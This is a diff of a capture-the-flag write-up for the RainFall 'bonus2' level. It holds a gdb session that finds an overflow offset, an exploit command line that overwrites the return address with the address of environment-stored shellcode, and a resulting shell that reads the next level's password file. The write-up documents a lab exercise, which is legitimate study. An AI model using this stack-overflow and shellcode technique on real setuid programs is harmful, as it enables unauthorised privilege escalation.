@@ -7,20 +7,29 @@ export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68
 ```
 
 ```shell
+(gdb) r `python -c 'print 41 * "A"'` "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab" 
+Breakpoint 2, 0x0804851f in greetuser ()
+(gdb) next
+Single stepping until exit from function greetuser,
+which has no line number information.
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+0x38614137 in ?? ()
+```
+Using [a pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) we found that the offset it segfaults at is 23 (with LANG=nl)
+
+```shell
+./bonus2 `python -c 'print 40 * "A"'` `python -c 'print 23 * "B" + "\x6c\xfd\xff\xbfa"'`
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBl���a
+$ cat /home/user/bonus3/.pass
+[redacted]
+```
+
+```shell
 $ ./a.out
 sizeof("Hyvää päivää ") = 19
 sizeof("Goedemiddag! ") = 14
+sizeof("Hello ") = 6;
 ```
 
-LANG=fi for bigger string | "a" 40 times to bypass '\0' | "b" 18 times to overflow + address of shellcode in env
-
-```shell
-bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c 'print "a"*40') $(python -c 'print "b"*18 + "\x6c\xfd\xff\xbfa"')
-Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbla
-$ whoami
-bonus3
-$ cat /home/user/bonus3/.pass
-```
-
-You can do it too with LANG=nl, but you need 5 extra bytes of padding.
-You can't do it with LANG=en
+You can do it too with LANG=fi, but you need 5 fewer bytes of padding, because the Finnish greeting is 5 chars longer (Unicode).
+You can't do it with LANG=en, because it's not long enough. When I try to repeat the steps, with the generated pattern, it doesn't find the right offset.
